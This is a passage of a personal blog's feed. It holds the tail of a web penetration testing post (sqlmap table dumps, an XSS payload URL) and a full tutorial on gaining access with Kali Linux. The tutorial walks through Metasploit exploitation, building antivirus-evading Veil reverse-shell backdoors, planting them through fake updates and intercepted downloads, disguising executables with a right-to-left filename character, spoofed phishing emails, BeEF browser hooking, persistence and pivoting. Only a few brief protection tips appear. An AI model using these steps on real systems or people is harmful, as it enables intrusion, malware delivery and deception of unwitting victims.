&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --tables -D [database]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;gets the tables in the -D database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" --columns -T [table_name] -D [database]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;gets columns in the tables of the database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sqlmap -u "[target_url]" -T [table_name] -D [database] --dump&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;Get all the data in the table of the database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="prevention-of-sql-vulnerabilities"&gt;Prevention of SQL Vulnerabilities&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Use filters (but can be bypassed)&lt;/li&gt;
&lt;li&gt;Use a deny list or allow list. (but can be bypassed)&lt;/li&gt;
&lt;li&gt;Best method is to code the web application in a way that does not allow code injection.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To do the above you must use parameterised statements. (where the data and the code are separated)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Prepare you statement most languages have a function for it.&lt;ul&gt;
&lt;li&gt;So the statement is static and only the value will be inserted eg. prepare(select * from username where username = ?) then when the statement is executed if it will search for the raw input data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use filters as second line.&lt;/li&gt;
&lt;li&gt;Use a user with the least amount of privileges needed.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="cross-site-scriptingxss"&gt;CROSS SITE SCRIPTING(XSS)&lt;/h2&gt;
&lt;p&gt;Executed on the people browsing the website not the server. Allows javascript injection onto the page. Code is executed when the page loads.&lt;/p&gt;
&lt;p&gt;3 main types&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Persistent/Stored XSS&lt;/li&gt;
&lt;li&gt;Reflected XSS - non persistent xss. only will work if the target visits a specially crafted url eg. &lt;code&gt;target.com/page.php?something=&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;DOM based XSS&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Test text boxes and urls with parameters (the php stuff).&lt;/p&gt;
&lt;p&gt;Inject beef hook into vulnerable pages. If text areas have a max length, go into developer console and inspect element and change the max length.&lt;/p&gt;
&lt;h3 id="prevention-of-xss-vulnerabilities"&gt;Prevention of XSS Vulnerabilities&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Minimize input.&lt;/li&gt;
&lt;li&gt;Convert user input to the html character symbol so &lt;code&gt;&amp;amp;nsb&lt;/code&gt; and instead of &amp;amp; use &lt;code&gt;&amp;amp;jsjs;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Escape the input.&lt;/li&gt;
&lt;li&gt;Rarely trust alerts within the browser!&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="to-automatically-discover-web-vulnerabilities"&gt;To Automatically Discover Web Vulnerabilities&lt;/h2&gt;
&lt;p&gt;Use Zed Attack Proxy (zap) &lt;a href="https://owasp.org/www-project-zap/"&gt;https://owasp.org/www-project-zap/&lt;/a&gt;, this is already installed on Kali.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Search in apps ZAP&lt;/li&gt;
&lt;li&gt;You have to get this app via github.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;chmod +x [name]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run it&lt;/li&gt;
&lt;li&gt;After install click no persistent.&lt;/li&gt;
&lt;li&gt;The cog icon on the left allows options to be modified&lt;/li&gt;
&lt;li&gt;If you click the green plus on the bottom window then go to active scans. then the little panel in the top left the the windows you can change policies.&lt;/li&gt;
&lt;li&gt;Add the url in automated scan.&lt;/li&gt;
&lt;li&gt;Bottom left under alerts, is where all the vulnerabilities that have been discovered are displayed.&lt;/li&gt;
&lt;li&gt;If you right click one of the alerts (bottom left) then open in browsers it will show you the exploit and how it got it.&lt;/li&gt;
&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry><entry><title>Gaining Access with Kali Linux</title><link href="https://jackmckew.dev/gaining-access-with-kali-linux.html" rel="alternate"></link><published>2020-09-04T00:00:00+10:00</published><updated>2020-09-04T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-04:/gaining-access-with-kali-linux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https â€¦&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;This post will go into ways we can use Kali Linux to gain access to the target PCs! What is Kali Linux? "Kali Linux is a Debian-based Linux distribution aimed at advanced Penetration Testing and Security Auditing". Kali Linux is free to download and you can find it at: &lt;a href="https://www.kali.org/downloads/"&gt;https://www.kali.org/downloads/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This post is apart of a series of posts, see the other posts at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/network-hacking-with-kali-linux.html"&gt;Network Hacking with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jackmckew.dev/web-penetration-testing-with-kali-linux.html"&gt;Web Penetration Testing with Kali Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you to Chris B for helping me with the notes in this post below!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="table-of-contents"&gt;Table of Contents &lt;!-- omit in toc --&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#gaining-access"&gt;Gaining Access&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#server-side-attacks"&gt;Server Side Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#metasploit"&gt;Metasploit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#exploiting-backdoors"&gt;Exploiting Backdoors&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#payloads"&gt;Payloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#nexpose"&gt;Nexpose&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#client-side-attacks"&gt;Client Side Attacks&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#protection"&gt;Protection&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#social-engineering"&gt;Social Engineering&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#maltego"&gt;Maltego&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#spoofing-file-type"&gt;Spoofing File Type&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#using-the-above---outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#post-exploitation"&gt;Post Exploitation&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#maintaining-access"&gt;Maintaining Access&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#pivoting"&gt;Pivoting&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="gaining-access"&gt;Gaining Access&lt;/h2&gt;
&lt;p&gt;Any electronic device is a computer all concepts will work wether it is a phone, tv, router, websites, webservers etc
Two types of attacks:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Server side - Doesn't require user interaction all we need is an IP&lt;/li&gt;
&lt;li&gt;Client side - Requires user interaction such as opening a file or clicking a link&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="server-side-attacks"&gt;Server Side Attacks&lt;/h3&gt;
&lt;p&gt;Make sure the machine is pingable (open terminal and run &lt;code&gt;ping [IP]&lt;/code&gt;). Learning as much as possible about the target is essential for conducting a successful attack, if you can learn things such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Operating systems&lt;/li&gt;
&lt;li&gt;Installed programs&lt;/li&gt;
&lt;li&gt;Ports being used&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can then use this information for identifying potential exploits (search engines are perfect for this). Things to look out for are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Run Zenmap (Nmap) on the IP. Click the ports and services tab up the top to learn about the ports being used / misconfigured.&lt;/li&gt;
&lt;li&gt;Google the version of operating system / programs for potential exploits&lt;/li&gt;
&lt;li&gt;If you find an open FTP (file transfer protocol) port, try to connect through it&lt;/li&gt;
&lt;li&gt;Try default usernames and passwords to log in (sometimes they won't have a password)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="metasploit"&gt;Metasploit&lt;/h4&gt;
&lt;p&gt;Metasploit is a penetration testing framework that makes hacking simple. It's an essential tool for many attackers and defenders. Point Metasploit at your target, pick an exploit, what payload to drop, and hit Enter. Before testing metasploit on a live system, it's preferential to test on a virtualised system, enter metasploitable. Metasploitable is an intentionally vulnerable target machine for evaluating Metasploit which is virtualised and can be downloaded from: &lt;a href="https://information.rapid7.com/download-metasploitable-2017.html"&gt;https://information.rapid7.com/download-metasploitable-2017.html&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="exploiting-backdoors"&gt;Exploiting Backdoors&lt;/h4&gt;
&lt;p&gt;First from the information you've gathered about the target, we can then search for what exploits are available, and to use metasploit is as easy as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt; (runs the metasploit console)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;help&lt;/code&gt; (help on any command)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show [something]&lt;/code&gt; (something can be exploits, payloads, auxilaries or options)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [something]&lt;/code&gt; (uses an exploit, payload, auxilarie)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set [option] [value]&lt;/code&gt; (configure [option] to have [value] )&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt; - runs the current task&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="an-example-backdoor-attack"&gt;An Example Backdoor Attack&lt;/h5&gt;
&lt;p&gt;Typically this will only work if the backdoor is already installed on the target computer.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;find out the exploit to use via google&lt;/li&gt;
&lt;li&gt;open &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;type &lt;code&gt;use [exploit_name/path]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show options&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the options (usually the RHOSTS) `set RHOSTS [ip]&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If this is successful, you will now have access to a remote terminal in the target and essentially do anything you want on the target machine.&lt;/p&gt;
&lt;h5 id="payloads"&gt;Payloads&lt;/h5&gt;
&lt;p&gt;A payload is a piece of code that is to be executed through an existing exploit. For example twp types of payloads are to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;to open a port on the target and connect to it (aka &lt;code&gt;bind&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;open a port on the attacking computer, connect to the attacking computer from the target bypassing the firewall (aka &lt;code&gt;reverse&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;On a &lt;code&gt;reverse&lt;/code&gt;, setting the open port on the attacking computer to 80, will mimic that of a typical webserver and thus also bypassing any firewall filtration.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Setting a payload in metasploit can be done with the option &lt;code&gt;set payload [payload]&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id="nexpose"&gt;Nexpose&lt;/h4&gt;
&lt;p&gt;Nexpose is another product from the creators of metasploitable, and it is a vulnerability scanner. Nexpose will find any available exploits in your network that could be used, this could be used from a red team (attacker) and blue team (defender) perspective!&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.rapid7.com/products/nexpose/"&gt;&lt;img alt="Nexpose" class="img-fluid" src="https://jackmckew.dev/img/nexpose.jpg"/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Nexpose can be downloaded from: &lt;a href="https://www.rapid7.com/products/nexpose/"&gt;https://www.rapid7.com/products/nexpose/&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a free community edition!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="client-side-attacks"&gt;Client Side Attacks&lt;/h3&gt;
&lt;p&gt;Client side attacks are typically the next step if server side attacks fail or are not viable in the situation. Although, client side attacks can potentially be more difficult to accomplish as we are now (likely) depending on the weakest link in the security to be the human rather than a computer. In client side attacks, social engineering is one of the most used attack vectors, which also means that gaining as much information as possible about the target is critical for a successful attack.&lt;/p&gt;
&lt;h4 id="creating-backdoors"&gt;Creating Backdoors&lt;/h4&gt;
&lt;p&gt;For creating backdoors we use a program called &lt;code&gt;veil&lt;/code&gt;. Veil can installed via &lt;code&gt;apt-get&lt;/code&gt;, and the source code is all open over at: &lt;a href="https://github.com/Veil-Framework/Veil"&gt;https://github.com/Veil-Framework/Veil&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To use Veil: (use evasion, and use a rev_https (aka reverse https connection)):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Run &lt;code&gt;veil&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;list&lt;/code&gt; to list available tools&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [toolname]&lt;/code&gt; to use tools, evasion is a typical tool to use&lt;/li&gt;
&lt;li&gt;&lt;code&gt;list&lt;/code&gt; (under a tool) to see available payloads&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use [payload number]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;check the options to set&lt;/li&gt;
&lt;li&gt;be sure to set the LHOST (the IP for the target to connect to)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LHOST [ip]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;if you have a webserver running change to port, a good port is 8080 (an alternate port used by webservers)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set LPORT 8080&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;options&lt;/code&gt; to see options.&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For bypassing more antivirus programs, the more options you change, the less likely an existing identified signature is out there, we can change these options with
    1.  &lt;code&gt;set PROCESSORS [number(1)]&lt;/code&gt; change processors.
    2.  &lt;code&gt;set SLEEP [number(6)]&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Finally use &lt;code&gt;generate&lt;/code&gt; to make backdoor.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To check if it is detectable you can use the check vt command (this will only check signatures)&lt;/li&gt;
&lt;li&gt;go to &lt;a href="https://nodistribute.com/"&gt;https://nodistribute.com/&lt;/a&gt; and scan there&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="connecting-from-the-backdoor"&gt;Connecting from the Backdoor&lt;/h5&gt;
&lt;p&gt;We need to listen for the connection. Need the attack payload and the port (eg, go/meterpeter/rev_https, 8080)&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open the metasploit framework. &lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;To listen use the handler module&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the payload &lt;code&gt;set PAYLOAD windows/meterpeter/reverse_https&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set the correct settings (the LPORT and LHOST you used in the backdoor).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now we wait for the target user to run the backdoor (the &lt;code&gt;.exe&lt;/code&gt; file).&lt;/p&gt;
&lt;h5 id="deploying-backdoors-via-fake-updates"&gt;Deploying Backdoors via Fake Updates&lt;/h5&gt;
&lt;p&gt;By mimicking an update server for a software package, we can hide out backdoor as a new update for a software. To do this we use &lt;code&gt;Evilgrade&lt;/code&gt; (which is also fully open source): &lt;a href="https://github.com/infobyte/evilgrade"&gt;https://github.com/infobyte/evilgrade&lt;/a&gt;. Once &lt;code&gt;evilgrade&lt;/code&gt; is installed, you can check hijackable programs using &lt;code&gt;show modules&lt;/code&gt;, configure options for said modules using &lt;code&gt;configure [module_name]&lt;/code&gt; and start &lt;code&gt;evilgrade&lt;/code&gt; with &lt;code&gt;start&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This then makes use of MITM attacks such as ARP or DNS spoofing, read more about these in my previous post at [INSERT KALI NETWORK HACKING POST].&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When using evilgrade, ensuring that the exploit is listening before mimicking the update server with the malicious software.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id="deploying-backdoors-via-exe-downloads"&gt;Deploying Backdoors via Exe Downloads&lt;/h5&gt;
&lt;p&gt;Another way to deploy backdoors, is to intercept an &lt;code&gt;.exe&lt;/code&gt; that is being downloaded on the target and replace it with the malicious &lt;code&gt;.exe&lt;/code&gt;. It's necessary to be the MITM to undertake this attack.&lt;/p&gt;
&lt;p&gt;One way to do this (although unsupported as of 08/2017) is via BDFProxy: &lt;a href="https://github.com/secretsquirrel/BDFProxy"&gt;https://github.com/secretsquirrel/BDFProxy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once up and running, whenever a user attempts to download an &lt;code&gt;.exe&lt;/code&gt;, it'll be intercepted and injected with the malicious backdoor. Note that the target &lt;code&gt;.exe&lt;/code&gt; will be downloaded and run as normal, not raising any suspicions from the user.&lt;/p&gt;
&lt;h4 id="protection"&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Ensure that there is no MITM in your network&lt;/li&gt;
&lt;li&gt;Only download from HTTPS pages&lt;/li&gt;
&lt;li&gt;Use checksums to ensure the download is as the provider desired it to be (eg, MD5)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="social-engineering"&gt;Social Engineering&lt;/h3&gt;
&lt;p&gt;The definition of social engineering (in information security context) is: "the use of deception to manipulate individuals into divulging confidential or personal information that may be used for fraudulent purposes.". The aim of the game is to gather as much information as possible about our target such that we can better pose an attack.&lt;/p&gt;
&lt;h4 id="maltego"&gt;Maltego&lt;/h4&gt;
&lt;p&gt;Maltego is a piece of software that we can easily &amp;amp; quickly gather information about a target, it can be downloaded from: &lt;a href="https://www.maltego.com/"&gt;https://www.maltego.com/&lt;/a&gt;. It can be used to determine where a specific target has accounts, websites, phone numbers, etc and who they may connect with. It shows all this in a graph representation in the client.&lt;/p&gt;
&lt;h4 id="backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/h4&gt;
&lt;p&gt;This is typically done by compiling a malicious script and then disguising it as the source file. Note that this may not work for more technically advanced targets, as when you change the icon for a &lt;code&gt;.exe&lt;/code&gt; file, there will still be a prompt to run this file when opened.&lt;/p&gt;
&lt;p&gt;For example, if you are trying to disguise a PDF, normally users aren't asked to run a PDF when opened, so this may raise suspicions with the target, and potentially foiling the attack.&lt;/p&gt;
&lt;h5 id="spoofing-file-type"&gt;Spoofing File Type&lt;/h5&gt;
&lt;p&gt;In the above example, we highlighted concerns that our file will prompt to be run and have the extension &lt;code&gt;.exe&lt;/code&gt;. We can circumvent this problem by spoofing our executable to look as if it was the original file type (eg, &lt;code&gt;.pdf&lt;/code&gt;). One way to do this is by using the right to left unicode character in the filename (&lt;code&gt;U+202E&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;So what we will do is if our target file that we want to disguise as is name &lt;code&gt;the-book-of-reflex.pdf&lt;/code&gt;. We will name our malicious executable as &lt;code&gt;the-book-of-reflfdp.exe&lt;/code&gt;, and insert a right to left unicode character before &lt;code&gt;fdp.exe&lt;/code&gt;, which will reverse the end of our file, thus ending up with &lt;code&gt;the-book-of-reflexe.pdf&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Browsers will typically remove the right to left unicode character in file names, so make sure to zip the malicious file to bypass this.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="spoofing-fake-emails"&gt;Spoofing Fake Emails&lt;/h4&gt;
&lt;p&gt;There's lots of free options out there on the web for sending fake emails, but they will likely end up in the spam box of the target's email. Another option is to find a SMTP (Simple Mail Transfer Protocol) server that offers a free program, typically these are used for marketing by companies so less likely to end up in the spam.&lt;/p&gt;
&lt;p&gt;Kali also provides a utility called &lt;code&gt;sendemail&lt;/code&gt; which we can use once we have a SMTP server to use. Find out more about this utility (with the source code) over at: &lt;a href="https://github.com/mogaal/sendemail"&gt;https://github.com/mogaal/sendemail&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once we're able to send a fake email, we can now embed our spoofed malicious executable on a file sharing website (eg, Google drive) and include it in the email (see &lt;a href="#backdooring-any-file-type"&gt;Backdooring Any File Type&lt;/a&gt;).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It's advisable to use an existing email that you know your target is familiar with from the information that you've gathered.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="beef-browser-exploitation-framework"&gt;BeEF (Browser Exploitation Framework)&lt;/h4&gt;
&lt;p&gt;From the BeEF website itself: "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.". You can also find the source code over at &lt;a href="https://github.com/beefproject/beef"&gt;https://github.com/beefproject/beef&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;What BeEF let's us do is insert some JavaScript code onto a website to 'hook' the website, allowing us to do lots of different things (eg, fake login pages, etc). Since the hook is just embedded in sites with JavaScript, this will enable attacks on any modern browser and device (eg, phones, tablets, laptops, etc).&lt;/p&gt;
&lt;p&gt;Once hooked you get all sorts of information on the target system including browser version, operating system, versions of capabilities (plugins) installed etc.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is easiest to deploy BeEF and run the commands when you are the MITM in the network. This will also allow us to hook &lt;strong&gt;all&lt;/strong&gt; websites the user visits rather than just the one.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;One example command we can use is to mimic a browser plug-in update to get the target to download and run a malicious backdoor.&lt;/p&gt;
&lt;h4 id="using-the-above-outside-the-local-network"&gt;Using the Above - Outside the Local Network&lt;/h4&gt;
&lt;p&gt;If you are using any of these attacks external to your local network, there's a few steps to configure to ensure:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Router must handle reverse connections&lt;/li&gt;
&lt;li&gt;Use public IP vs Private IP of the router&lt;/li&gt;
&lt;li&gt;Forward the targeted port of the router to the attacking machine in the local network&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="post-exploitation"&gt;Post Exploitation&lt;/h2&gt;
&lt;p&gt;The main part of launching a hack is not only to get access to a target PC, but get/find what's on the target and make sure that we can always get into the target. Another prime example on conducting a hack on a target PC, may not be to get to that exact machine, more so to get into the network that machine is connected to and find other resources (this is also known as pivoting).&lt;/p&gt;
&lt;h3 id="maintaining-access"&gt;Maintaining Access&lt;/h3&gt;
&lt;p&gt;Once you have backdoored into a system, the backdoor connection is likely running on a process (similar to what you see in task manager on Windows), it's typically good practice to migrate the backdoor connection onto a process that is unlikely to be closed (eg, &lt;code&gt;explorer.exe&lt;/code&gt;). If you are using metasploit for this, it's as easy as running &lt;code&gt;migrate [processID]&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There's also other methodologies for maintaining access such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Using veil-evasion (see &lt;a href="#creating-backdoors"&gt;Creating Backdoors&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Use metasploit persistence to maintain the connection&lt;/li&gt;
&lt;li&gt;Use metasploit and veil-evasion together:&lt;ol&gt;
&lt;li&gt;Background your current meterpeter session &lt;code&gt;background&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use a module in msfconsole &lt;code&gt;use exsploit/windows/local/persistance&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;show options&lt;/code&gt; to configure&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set EXE_NAME browser&lt;/code&gt; (or something inconspicuous)&lt;/li&gt;
&lt;li&gt;set the session you wish to place &lt;code&gt;set SESSION [no.]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use the EXE::Custom the inject veil backdoor (not service).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set EXE::Custom [path]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="pivoting"&gt;Pivoting&lt;/h3&gt;
&lt;p&gt;Use the device you hacked, hack into other devices on the intranet. We can set up an autoroute to use metasploit on the infected target as if it was the source attacking device.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Upload any tools you need. (in metasploit) eg. Nmap&lt;/li&gt;
&lt;li&gt;use autoroute (in metasploit)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;use post/windows/manage/autoroute&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set subnet [subnet]&lt;/code&gt; - Set the subnet to the first 3 dots then 0 ie. xx.xx.xx.0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set session [id]&lt;/code&gt; - Sets the session to run it on.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exploit&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>